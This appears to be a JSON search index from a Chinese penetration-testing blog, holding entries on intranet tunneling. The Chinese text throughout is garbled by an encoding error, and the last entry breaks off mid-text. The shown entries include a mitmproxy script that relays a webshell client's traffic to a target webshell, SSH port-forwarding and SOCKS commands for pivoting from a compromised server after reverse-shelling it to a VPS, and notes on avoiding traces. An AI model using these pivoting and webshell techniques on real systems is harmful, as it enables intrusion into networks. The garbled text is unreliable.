self.get_https_url(flow.request.host, flow.request.path) # æ‰“å°è½¬å‘å‰çš„è¯·æ±‚å†…å®¹ print(\u0026#34;Original Request:\u0026#34;) print(flow.request.headers) print(flow.request.content.decode()) # å‘é€POSTè¯·æ±‚åˆ°ç›®æ ‡HTTPSæœåŠ¡å™¨ while True: try: response = self.make_https_request(url, flow.request.content) break except: continue while True: try: response = self.make_https_request(url, flow.request.content) if response.status_code != 404: break continue except: continue # æ‰“å°è½¬å‘åçš„å“åº”å†…å®¹ print(\u0026#34;Forwarded Response:\u0026#34;) print(response.headers) print(response.content.decode()) # å°†HTTPSå“åº”è¿”å›ç»™ç›‘å¬ headers = [(k.encode(\u0026#39;utf-8\u0026#39;), v.encode(\u0026#39;utf-8\u0026#39;)) for k, v in response.headers.items()] flow.response = http.Response.make( 200, response.content, headers ) def make_https_request(self, url, data): proxies = { \u0026#39;http\u0026#39;: \u0026#39;http://127.0.0.1:8080\u0026#39;, \u0026#39;https\u0026#39;: \u0026#39;https://127.0.0.1:8080\u0026#39; } # è‡ªå®šä¹‰è¶…æ—¶æ—¶é—´ä¸º10ç§’ response = requests.post(url, data=data, timeout=3, proxies=proxies, verify=False) return response def get_https_url(self, host, path): # æ ¹æ®éœ€è¦ä¿®æ”¹ä¸ºç›¸åº”çš„HTTPSåœ°å€ https_host = f\u0026#34;https://{host}\u0026#34; return f\u0026#34;{https_host}{path}\u0026#34; addons = [ ProxyAddon() ] å°†webshellè¿æ¥å·¥å…·ï¼ˆæ¯”å¦‚èšå‰‘ï¼‰è®¾ç½®ä»£ç†åˆ°è¯¥mitmproxyè„šæœ¬ä¸Šï¼Œè„šæœ¬ä¼šä¸»åŠ¨å¾ªç¯è½¬å‘è¯·æ±‚åˆ°ç›®æ ‡webshellä¸Šï¼Œç›´åˆ°æ­£ç¡®å“åº”ï¼Œå†å°†å“åº”è¿”å›ç»™webshellè¿æ¥å·¥å…·\n"
    }
,
    {
        "title": "éš§é“ä»£ç†-åŸºäºLinuxåŸç”Ÿå·¥å…·çš„éš§é“ä»£ç†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E5%9F%BA%E4%BA%8Elinux%E5%8E%9F%E7%94%9F%E5%B7%A5%E5%85%B7%E7%9A%84%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/",
        "content": "éš§é“ä»£ç†-åŸºäºLinuxåŸç”Ÿå·¥å…·çš„éš§é“ä»£ç† æ–‡ç« çš„çµæ„Ÿæ¥è‡ªäºé¢è¯•å®˜çš„é—®é¢˜ï¼šâ€œçŸ¥é“linuxä¸ä¸Šä¼ ä»»ä½•å·¥å…·æ€ä¹ˆæ­éš§é“ä»£ç†å—â€\nç”±äºå¹³æ—¶ä¹ æƒ¯ç›´æ¥ä½¿ç”¨frpã€venomã€suo5ç­‰ä»£ç†å·¥å…·ï¼Œæˆ–è€…æ˜¯ç›´æ¥ä½¿ç”¨C2è‡ªå¸¦çš„ä»£ç†ï¼Œæ‰€ä»¥è¢«é—®åˆ°çš„æ—¶å€™ç›´æ¥æ‡µäº†ï¼Œåé¢æ‰å‘ç°æˆ‘ç«Ÿç„¶åœ¨å­¦ä¹ ä»£ç†çš„æ—¶å€™æ˜¯å­¦è¿‡çš„ï¼šéš§é“ä»£ç†-ç«¯å£è½¬å‘ç›¸å…³å·¥å…·ï¼Œä½†æ˜¯å½“æ—¶æ²¡æœ‰ä¸Šæ‰‹å®è·µæ‰€ä»¥æ ¹æœ¬æ²¡è®°ä½ï¼Œç‰¹æœ‰æ­¤ç¯‡æ–‡ç« æ¥è®°å½•ç›¸å…³æ“ä½œ\nå‡†å¤‡å·¥ä½œ æˆ‘å†™äº†ä¸€ä¸ªpythonè„šæœ¬ï¼Œç”¨äºåœ¨å†…ç½‘èµ·ä¸€ä¸ªwebç½‘é¡µï¼Œé€šè¿‡æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­ä»£ç†æ˜¯å¦æˆåŠŸï¼š\nimport http.server import socketserver PORT = 8005 CONTENT = b\u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Proxy Test\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;proxytest\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;success\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; class CustomHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header(\u0026#34;Content-type\u0026#34;, \u0026#34;text/html; charset=utf-8\u0026#34;) self.end_headers() self.wfile.write(CONTENT) def log_message(self, format, *args): return if __name__ == \u0026#34;__main__\u0026#34;: with socketserver.TCPServer((\u0026#34;0.0.0.0\u0026#34;, PORT), CustomHandler) as httpd: print(f\u0026#34;[+] Serving on port {PORT} ...\u0026#34;) httpd.serve_forever() åœ¨è¢«æ§æœåŠ¡å™¨å†…ç½‘çš„8005ç«¯å£è¿è¡Œï¼ˆç”±äºå®‰å…¨ç»„ç­‰åŸå› ï¼Œä¸ä¼šå¼€æ”¾åˆ°å¤–ç½‘ï¼‰ï¼š\nå¯ä»¥çœ‹åˆ°ç°åœ¨æ˜¯æ— æ³•åœ¨å¤–ç½‘è®¿é—®çš„ï¼š æ¥ä¸‹æ¥å¼€å§‹è¿›è¡Œä»£ç†æ“ä½œ\nSSHç«¯å£è½¬å‘ é¦–å…ˆæ˜¯ç«¯å£è½¬å‘ï¼Œä¸€èˆ¬éƒ½æ˜¯é€‰æ‹©æ­£å‘è½¬å‘ï¼š\nssh -CfNg -L [æœ¬åœ°ç«¯å£]:[å†…ç½‘ä¸»æœºIP]:[å†…ç½‘ä¸»æœºç«¯å£] [å¤–ç½‘ä¸»æœºIP] è¿™é‡Œçš„å‚æ•°å«ä¹‰å¦‚ä¸‹ï¼š\n-Cï¼šå¯ç”¨å‹ç¼©ï¼ˆCompressï¼‰ï¼Œå‡å°‘ä¼ è¾“æ•°æ®é‡ï¼Œæé«˜éš§é“æ•ˆç‡ï¼Œå°¤å…¶åœ¨ç½‘ç»œè¾ƒå·®æ—¶ -fï¼šåœ¨éªŒè¯æˆåŠŸååå°è¿è¡Œ SSHï¼Œå¦åˆ™ä¼šé˜»å¡ç»ˆç«¯ -Nï¼šä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºç«¯å£è½¬å‘ -gï¼šå…è®¸å…¶ä»–ä¸»æœºè¿æ¥åˆ°ä½ æœ¬åœ°ç»‘å®šçš„ç«¯å£ï¼ˆå¦åˆ™é»˜è®¤åªå…è®¸æœ¬æœºè®¿é—®ï¼‰ -Lï¼šå¯ç”¨æœ¬åœ°ç«¯å£è½¬å‘ é¦–å…ˆå°†è¿™ä¸ªå°è¢«æ§ä¸»æœºåå¼¹shellåˆ°æˆ‘çš„æ§åˆ¶ç«¯vpsä¸Šï¼š\nç„¶åpythonè·å–ptyï¼ˆä¸€å®šè¦æœ‰ä¸€ä¸ªäº¤äº’å¼shellï¼Œæˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œåå¼¹çš„shellä¸èƒ½ç›´æ¥è¾“å…¥sshè¿æ¥çš„å¯†ç ï¼‰ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰sshå¹¶ç«¯å£è½¬å‘ï¼Œå°†å†…ç½‘8005ç«¯å£è½¬å‘åˆ°å¤–ç½‘2333ç«¯å£ï¼š\nssh -CfNg -L 2333:127.0.0.1:8005 [è¢«æ§ç«¯æœåŠ¡å™¨å…¬ç½‘IP] [å›è½¦åè¾“å…¥è·å–åˆ°çš„å†…ç½‘ä¸»æœºè´¦æˆ·å¯†ç ] å¦‚æ­¤å°±å®ç°äº†ç«¯å£çš„è½¬å‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®å…¬ç½‘2333ç«¯å£çœ‹åˆ°å†…ç½‘çš„8005ç«¯å£webé¡µé¢ï¼š\nåœ¨æµ‹è¯•å®Œæ¯•åï¼Œåªéœ€è¦killæ‰ç›¸åº”è¿›ç¨‹å³å¯ï¼š\nSSHåŠ¨æ€è½¬å‘ ç”±äºç«¯å£è½¬å‘åªèƒ½è®©æˆ‘ä»¬å¯ä»¥è®¿é—®å›ºå®šçš„å†…ç½‘æœåŠ¡ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¼šé™åˆ¶æˆ‘ä»¬çš„å†…ç½‘æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘åŠ¨æ€è½¬å‘ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»ä¼¼socks5ä»£ç†çš„æ–¹æ³•ï¼š\nssh -N -D [æœ¬åœ°ç›‘å¬IP]:[æœ¬åœ°ç›‘å¬ç«¯å£] [ç”¨æˆ·å]@[è·³æ¿æœºå†…ç½‘IP] å‚æ•°ï¼š\n-Nï¼šä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…å»ºç«‹éš§é“ï¼ˆç”¨äºç«¯å£è½¬å‘ï¼‰ -Dï¼šå¯åŠ¨ä¸€ä¸ª SOCKS5 ä»£ç†ï¼Œç›‘å¬åœ¨æœ¬åœ°æŒ‡å®šçš„ IP å’Œç«¯å£ æ‰€ä»¥å‰é¢çš„æ­¥éª¤å’Œä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯sshçš„ä½¿ç”¨å‘½ä»¤å˜äº†ï¼š\nssh -N -D 0.0.0.0:2333 root@[è¢«æ§æœåŠ¡å™¨å†…ç½‘IP] æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨proxifierä¸Šé…ç½®socks5ä»£ç†ï¼Œå®ç°å¯¹å†…ç½‘IPè®¿é—®çš„è½¬å‘ï¼š\næ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥éšæ„çš„è®¿é—®172.21.130.1/24æ®µçš„å†…ç½‘æœåŠ¡äº†ï¼Œæ¯”å¦‚æµè§ˆå™¨ç›´æ¥è®¿é—®ä¸Šé¢å†…ç½‘çš„8005ç«¯å£ç½‘é¡µï¼š\nç”±äºè¿™é‡Œçš„åŠ¨æ€è½¬å‘å¹¶æ²¡æœ‰ä½¿ç”¨-få‚æ•°ï¼Œæ‰€ä»¥ä¸ä¼šåœ¨åå°è¿è¡Œï¼Œåœ¨æ–­å¼€è¿æ¥åï¼Œsshè¿›ç¨‹å°±è‡ªåŠ¨é€€å‡ºäº†ï¼Œä¸éœ€è¦killè¿›ç¨‹æ¥æ¸…æ¥šç—•è¿¹ï¼š\næ€»ç»“ è¿™é‡Œæˆ‘ä»¬è®°å½•äº†ä¸¤ç§é€šè¿‡SSHåœ¨linuxä¸»æœºæ­å»ºéš§é“ä»£ç†çš„æ–¹å¼ï¼Œåœ¨ä¸æ–¹ä¾¿ä¸Šä¼ ä»£ç†å·¥å…·ç­‰ç‰¹æ®Šæƒ…å†µå¯ä»¥è€ƒè™‘ä½¿ç”¨ï¼Œå…¶å®åŒæ ·çš„åœ¨windowsä¸Šä¹Ÿæœ‰netshï¼ˆåªèƒ½ç”¨äºç«¯å£è½¬å‘ï¼‰ï¼Œä½†ç”±äºwindowsçš„æ¸—é€é€šå¸¸éƒ½éœ€è¦ä¸Šçº¿åˆ°C2ï¼Œè€ŒC2çš„ä»£ç†åŠŸèƒ½å›ºç„¶å¥½ç”¨æ›´å¤šï¼Œæ‰€ä»¥å°±ä¸è®°å½•äº†\n",
        "summary": "éš§é“ä»£ç†-åŸºäºLinuxåŸç”Ÿå·¥å…·çš„éš§é“ä»£ç† æ–‡ç« çš„çµæ„Ÿæ¥è‡ªäºé¢è¯•å®˜çš„é—®é¢˜ï¼šâ€œçŸ¥é“linuxä¸ä¸Šä¼ ä»»ä½•å·¥å…·æ€ä¹ˆæ­éš§é“ä»£ç†å—â€\nç”±äºå¹³æ—¶ä¹ æƒ¯ç›´æ¥ä½¿ç”¨frpã€venomã€suo5ç­‰ä»£ç†å·¥å…·ï¼Œæˆ–è€…æ˜¯ç›´æ¥ä½¿ç”¨C2è‡ªå¸¦çš„ä»£ç†ï¼Œæ‰€ä»¥è¢«é—®åˆ°çš„æ—¶å€™ç›´æ¥æ‡µäº†ï¼Œåé¢æ‰å‘ç°æˆ‘ç«Ÿç„¶åœ¨å­¦ä¹ ä»£ç†çš„æ—¶å€™æ˜¯å­¦è¿‡çš„ï¼šéš§é“ä»£ç†-ç«¯å£è½¬å‘ç›¸å…³å·¥å…·ï¼Œä½†æ˜¯å½“æ—¶æ²¡æœ‰ä¸Šæ‰‹å®è·µæ‰€ä»¥æ ¹æœ¬æ²¡è®°ä½ï¼Œç‰¹æœ‰æ­¤ç¯‡æ–‡ç« æ¥è®°å½•ç›¸å…³æ“ä½œ\nå‡†å¤‡å·¥ä½œ æˆ‘å†™äº†ä¸€ä¸ªpythonè„šæœ¬ï¼Œç”¨äºåœ¨å†…ç½‘èµ·ä¸€ä¸ªwebç½‘é¡µï¼Œé€šè¿‡æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­ä»£ç†æ˜¯å¦æˆåŠŸï¼š\nimport http.server import socketserver PORT = 8005 CONTENT = b\u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Proxy Test\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;proxytest\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;success\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; class CustomHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header(\u0026#34;Content-type\u0026#34;, \u0026#34;text/html; charset=utf-8\u0026#34;) self.end_headers() self.wfile.write(CONTENT) def log_message(self, format, *args): return if __name__ == \u0026#34;__main__\u0026#34;: with socketserver.TCPServer((\u0026#34;0.0.0.0\u0026#34;, PORT), CustomHandler) as httpd: print(f\u0026#34;[+] Serving on port {PORT} ...\u0026#34;) httpd.serve_forever() åœ¨è¢«æ§æœåŠ¡å™¨å†…ç½‘çš„8005ç«¯å£è¿è¡Œï¼ˆç”±äºå®‰å…¨ç»„ç­‰åŸå› ï¼Œä¸ä¼šå¼€æ”¾åˆ°å¤–ç½‘ï¼‰ï¼š\nå¯ä»¥çœ‹åˆ°ç°åœ¨æ˜¯æ— æ³•åœ¨å¤–ç½‘è®¿é—®çš„ï¼š æ¥ä¸‹æ¥å¼€å§‹è¿›è¡Œä»£ç†æ“ä½œ\nSSHç«¯å£è½¬å‘ é¦–å…ˆæ˜¯ç«¯å£è½¬å‘ï¼Œä¸€èˆ¬éƒ½æ˜¯é€‰æ‹©æ­£å‘è½¬å‘ï¼š\nssh -CfNg -L [æœ¬åœ°ç«¯å£]:[å†…ç½‘ä¸»æœºIP]:[å†…ç½‘ä¸»æœºç«¯å£] [å¤–ç½‘ä¸»æœºIP] è¿™é‡Œçš„å‚æ•°å«ä¹‰å¦‚ä¸‹ï¼š\n-Cï¼šå¯ç”¨å‹ç¼©ï¼ˆCompressï¼‰ï¼Œå‡å°‘ä¼ è¾“æ•°æ®é‡ï¼Œæé«˜éš§é“æ•ˆç‡ï¼Œå°¤å…¶åœ¨ç½‘ç»œè¾ƒå·®æ—¶ -fï¼šåœ¨éªŒè¯æˆåŠŸååå°è¿è¡Œ SSHï¼Œå¦åˆ™ä¼šé˜»å¡ç»ˆç«¯ -Nï¼šä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºç«¯å£è½¬å‘ -gï¼šå…è®¸å…¶ä»–ä¸»æœºè¿æ¥åˆ°ä½ æœ¬åœ°ç»‘å®šçš„ç«¯å£ï¼ˆå¦åˆ™é»˜è®¤åªå…è®¸æœ¬æœºè®¿é—®ï¼‰ -Lï¼šå¯ç”¨æœ¬åœ°ç«¯å£è½¬å‘ é¦–å…ˆå°†è¿™ä¸ªå°è¢«æ§ä¸»æœºåå¼¹shellåˆ°æˆ‘çš„æ§åˆ¶ç«¯vpsä¸Šï¼š\nç„¶åpythonè·å–ptyï¼ˆä¸€å®šè¦æœ‰ä¸€ä¸ªäº¤äº’å¼shellï¼Œæˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œåå¼¹çš„shellä¸èƒ½ç›´æ¥è¾“å…¥sshè¿æ¥çš„å¯†ç ï¼‰ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰sshå¹¶ç«¯å£è½¬å‘ï¼Œå°†å†…ç½‘8005ç«¯å£è½¬å‘åˆ°å¤–ç½‘2333ç«¯å£ï¼š\nssh -CfNg -L 2333:127.0.0.1:8005 [è¢«æ§ç«¯æœåŠ¡å™¨å…¬ç½‘IP] [å›è½¦åè¾“å…¥è·å–åˆ°çš„å†…ç½‘ä¸»æœºè´¦æˆ·å¯†ç ] "
    }
,
    {
        "title": "éš§é“ä»£ç†-åŸºç¡€çŸ¥è¯†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/",
        "content": "éš§é“ä»£ç†-åŸºç¡€çŸ¥è¯† æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œåœ¨å¤–ç½‘getshellä¹‹åï¼Œéœ€è¦é€šè¿‡è½¬å‘ç«¯å£æˆ–æ­å»ºä»£ç†ç­‰æ–¹å¼å»ºç«‹å†…ç½‘é€šé“\néš§é“åˆ†ç±» ä»æµé‡å±‚åˆ†ç±» åº”ç”¨å±‚éš§é“ï¼ˆDNSã€SOCKSã€HTTPã€SSHï¼‰ ä¼ è¾“å±‚éš§é“ï¼ˆTCPéš§é“ã€UDPéš§é“ï¼‰ ç½‘ç»œå±‚éš§é“ï¼ˆICMPã€IPv6éš§é“ï¼‰ ä»ä½œç”¨ä¸Šåˆ†ç±» åå¼¹shellï¼ˆncã€pythonã€bashï¼‰ ç«¯å£è½¬å‘ï¼ˆLCXã€SSHã€iptablesã€telnetï¼‰ ç«¯å£æ˜ å°„ï¼ˆLCXã€NPSã€FRPï¼‰ æ­£å‘ä»£ç†ï¼ˆEWã€NPSã€FRPï¼‰ åå‘ä»£ç†ï¼ˆEWã€NPSã€FRPï¼‰ é‡è¦æ¦‚å¿µ æ­£å‘è¿æ¥å’Œåå‘è¿æ¥ æ­£å‘æ˜¯ä»æ”»å‡»è€…ç”µè„‘ä¸»åŠ¨è®¿é—®ç›®æ ‡æœºå™¨ï¼Œä¾‹å¦‚ï¼šå—æ§ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±æ§åˆ¶ç«¯ä¸»æœºä¸»åŠ¨è¿æ¥å—æ§ç«¯ä¸»æœºå»ºç«‹shellï¼ˆé€‚ç”¨äºå—æ§ä¸»æœºå…·æœ‰å…¬ç½‘IPï¼‰ åå‘æ˜¯ä»ç›®æ ‡æœºå™¨ä¸»åŠ¨è¿æ¥æ”»å‡»è€…ç”µè„‘ï¼Œä¾‹å¦‚ï¼šæ§åˆ¶ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œåœ¨å—æ§ç«¯ä¸»æœºæ‰§è¡Œæ“ä½œè®¿é—®æ§åˆ¶ç«¯ä¸»æœºå»ºç«‹çš„shellæ˜¯åå¼¹shellï¼ˆé€‚ç”¨äºå—æ§ç«¯ä¸»æœºæ²¡æœ‰å…¬ç½‘IPçš„æˆ–æ§åˆ¶ç«¯å­˜åœ¨å…¬ç½‘IPç­‰æƒ…å†µï¼‰ å…¸å‹ä¾‹å­æ˜¯ï¼šMetasploitæœ‰ä¸¤ç§meterpreterï¼Œä¸€ç§æ˜¯ä»¥windows/meterpreter/bind_tcpä¸ºä»£è¡¨çš„bind shellï¼Œç”¨äºæ­£å‘è¿æ¥ï¼›ä¸€ç§æ˜¯ä»¥windows/meterpreter/reverse_tcpä¸ºä»£è¡¨çš„reverse shellï¼Œç”¨äºåå‘è¿æ¥\næ¸—é€è¿‡ç¨‹ä¸­ï¼Œæ­£å‘è¿æ¥å¸¸å—é™äºé˜²ç«å¢™æˆ–æƒé™ä¸è¶³ï¼Œè€Œåå‘è¿æ¥å¯ä»¥æœ‰æ•ˆçªç ´è¿™äº›é™åˆ¶ï¼ˆå› ä¸ºé˜²ç«å¢™å¯¹å‡ºç«™æµé‡çš„é™åˆ¶é€šå¸¸æ¯”å¯¹å…¥ç«™æµé‡çš„é™åˆ¶è¦å®½æ¾ï¼‰\nç«¯å£è½¬å‘å’Œç«¯å£æ˜ å°„ ä¸¤è€…åœ¨é€šå¸¸æƒ…å†µä¸‹æœªä½œä¸¥æ ¼åŒºåˆ†ï¼Œè¿™é‡Œä»…ç¨ä½œè§£é‡Š\nç«¯å£è½¬å‘ï¼šæœ‰æ—¶è¢«ç§°ä¸ºåšéš§é“ï¼Œæ˜¯SSHæˆ–NATçš„ä¸€ç§åº”ç”¨ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†ä¸€ä¸ªç«¯å£æ”¶åˆ°çš„æ•°æ®/æµé‡è½¬å‘åˆ°å¦ä¸€ä¸ªç«¯å£ï¼Œè€Œè½¬å‘åˆ°çš„ç«¯å£å¯ä»¥æ˜¯æœ¬æœºç«¯å£ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä¸»æœºä¸Šçš„ç«¯å£ï¼ˆå‰ææ˜¯å…¶ä»–ä¸»æœºä¸æœ¬æœºæœ‰ç½‘ç»œè¿æ¥ï¼‰\nå¦‚æœå†…ç½‘ä¸­ï¼Œéƒ¨ç½²çš„é˜²ç«å¢™ä¼šæ£€æŸ¥æ•æ„Ÿç«¯å£çš„è¿æ¥æƒ…å†µå¹¶é˜»æ–­å¼‚å¸¸é€šä¿¡ï¼Œå¯ä»¥é€šè¿‡ç«¯å£è½¬å‘ï¼Œå¯ä»¥ç»•è¿‡é˜²ç«å¢™ï¼Œå®ç°é€šè¿‡è®¿é—®å…è®¸çš„ç«¯å£æ¥ä¸æ•æ„Ÿç«¯å£é€šä¿¡\nç«¯å£æ˜ å°„ï¼šæ˜¯NATçš„ä¸€ç§ï¼ŒåŠŸèƒ½æ˜¯æŠŠåœ¨å…¬ç½‘çš„åœ°å€è½¬æˆç§æœ‰åœ°å€ã€‚ç®€å•æ¥è¯´å°±æ˜¯å°†ä¸€ä¸ªç«¯å£æ˜ å°„åˆ°å¦ä¸€ä¸ªç«¯å£ï¼Œæ›´é€‚ç”¨äºæè¿°å¤–ç½‘è·¯ç”±å™¨ï¼ˆè€Œä¸æ˜¯å¤–ç½‘ä¸»æœºï¼‰æ˜ å°„è‡³å†…ç½‘ä¸»æœº\nHTTPä»£ç†å’Œsocksä»£ç† httpä»£ç†ç”¨çš„æ˜¯httpåè®®ï¼Œå·¥ä½œåœ¨åº”ç”¨å±‚ï¼Œä¸»è¦æ˜¯ç”¨æ¥ä»£ç†æµè§ˆå™¨è®¿é—®ç½‘é¡µ socksä»£ç†ç”¨çš„æ˜¯socksåè®®ï¼Œæ ‡å‡†ç«¯å£ä¸º1080ï¼Œå·¥ä½œåœ¨ä¼šè¯å±‚ï¼Œä¸»è¦ç”¨æ¥ä¼ é€’æ•°æ®åŒ…ã€‚socksä»£ç†æœ‰socks4å’Œsocks5ä¸¤ä¸ªç‰ˆæœ¬ï¼Œsocks4åªæ”¯æŒTCPï¼Œsocks5æ”¯æŒUDPã€TCPç­‰åè®®ã€‚åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œé€šè¿‡æ­å»ºsocksä»£ç†ï¼Œå¯ä»¥æ— éœ€è¿›è¡Œå¤šæ¬¡ç«¯å£è½¬å‘ï¼Œè¾¾åˆ°ä¸ç›®æ ‡å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡çš„ç›®çš„ ",
        "summary": "éš§é“ä»£ç†-åŸºç¡€çŸ¥è¯† æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œåœ¨å¤–ç½‘getshellä¹‹åï¼Œéœ€è¦é€šè¿‡è½¬å‘ç«¯å£æˆ–æ­å»ºä»£ç†ç­‰æ–¹å¼å»ºç«‹å†…ç½‘é€šé“\néš§é“åˆ†ç±» ä»æµé‡å±‚åˆ†ç±» åº”ç”¨å±‚éš§é“ï¼ˆDNSã€SOCKSã€HTTPã€SSHï¼‰ ä¼ è¾“å±‚éš§é“ï¼ˆTCPéš§é“ã€UDPéš§é“ï¼‰ ç½‘ç»œå±‚éš§é“ï¼ˆICMPã€IPv6éš§é“ï¼‰ ä»ä½œç”¨ä¸Šåˆ†ç±» åå¼¹shellï¼ˆncã€pythonã€bashï¼‰ ç«¯å£è½¬å‘ï¼ˆLCXã€SSHã€iptablesã€telnetï¼‰ ç«¯å£æ˜ å°„ï¼ˆLCXã€NPSã€FRPï¼‰ æ­£å‘ä»£ç†ï¼ˆEWã€NPSã€FRPï¼‰ åå‘ä»£ç†ï¼ˆEWã€NPSã€FRPï¼‰ é‡è¦æ¦‚å¿µ æ­£å‘è¿æ¥å’Œåå‘è¿æ¥ æ­£å‘æ˜¯ä»æ”»å‡»è€…ç”µè„‘ä¸»åŠ¨è®¿é—®ç›®æ ‡æœºå™¨ï¼Œä¾‹å¦‚ï¼šå—æ§ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±æ§åˆ¶ç«¯ä¸»æœºä¸»åŠ¨è¿æ¥å—æ§ç«¯ä¸»æœºå»ºç«‹shellï¼ˆé€‚ç”¨äºå—æ§ä¸»æœºå…·æœ‰å…¬ç½‘IPï¼‰ åå‘æ˜¯ä»ç›®æ ‡æœºå™¨ä¸»åŠ¨è¿æ¥æ”»å‡»è€…ç”µè„‘ï¼Œä¾‹å¦‚ï¼šæ§åˆ¶ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œåœ¨å—æ§ç«¯ä¸»æœºæ‰§è¡Œæ“ä½œè®¿é—®æ§åˆ¶ç«¯ä¸»æœºå»ºç«‹çš„shellæ˜¯åå¼¹shellï¼ˆé€‚ç”¨äºå—æ§ç«¯ä¸»æœºæ²¡æœ‰å…¬ç½‘IPçš„æˆ–æ§åˆ¶ç«¯å­˜åœ¨å…¬ç½‘IPç­‰æƒ…å†µï¼‰ å…¸å‹ä¾‹å­æ˜¯ï¼šMetasploitæœ‰ä¸¤ç§meterpreterï¼Œä¸€ç§æ˜¯ä»¥windows/meterpreter/bind_tcpä¸ºä»£è¡¨çš„bind shellï¼Œç”¨äºæ­£å‘è¿æ¥ï¼›ä¸€ç§æ˜¯ä»¥windows/meterpreter/reverse_tcpä¸ºä»£è¡¨çš„reverse shellï¼Œç”¨äºåå‘è¿æ¥\næ¸—é€è¿‡ç¨‹ä¸­ï¼Œæ­£å‘è¿æ¥å¸¸å—é™äºé˜²ç«å¢™æˆ–æƒé™ä¸è¶³ï¼Œè€Œåå‘è¿æ¥å¯ä»¥æœ‰æ•ˆçªç ´è¿™äº›é™åˆ¶ï¼ˆå› ä¸ºé˜²ç«å¢™å¯¹å‡ºç«™æµé‡çš„é™åˆ¶é€šå¸¸æ¯”å¯¹å…¥ç«™æµé‡çš„é™åˆ¶è¦å®½æ¾ï¼‰\nç«¯å£è½¬å‘å’Œç«¯å£æ˜ å°„ ä¸¤è€…åœ¨é€šå¸¸æƒ…å†µä¸‹æœªä½œä¸¥æ ¼åŒºåˆ†ï¼Œè¿™é‡Œä»…ç¨ä½œè§£é‡Š\nç«¯å£è½¬å‘ï¼šæœ‰æ—¶è¢«ç§°ä¸ºåšéš§é“ï¼Œæ˜¯SSHæˆ–NATçš„ä¸€ç§åº”ç”¨ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†ä¸€ä¸ªç«¯å£æ”¶åˆ°çš„æ•°æ®/æµé‡è½¬å‘åˆ°å¦ä¸€ä¸ªç«¯å£ï¼Œè€Œè½¬å‘åˆ°çš„ç«¯å£å¯ä»¥æ˜¯æœ¬æœºç«¯å£ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä¸»æœºä¸Šçš„ç«¯å£ï¼ˆå‰ææ˜¯å…¶ä»–ä¸»æœºä¸æœ¬æœºæœ‰ç½‘ç»œè¿æ¥ï¼‰\nå¦‚æœå†…ç½‘ä¸­ï¼Œéƒ¨ç½²çš„é˜²ç«å¢™ä¼šæ£€æŸ¥æ•æ„Ÿç«¯å£çš„è¿æ¥æƒ…å†µå¹¶é˜»æ–­å¼‚å¸¸é€šä¿¡ï¼Œå¯ä»¥é€šè¿‡ç«¯å£è½¬å‘ï¼Œå¯ä»¥ç»•è¿‡é˜²ç«å¢™ï¼Œå®ç°é€šè¿‡è®¿é—®å…è®¸çš„ç«¯å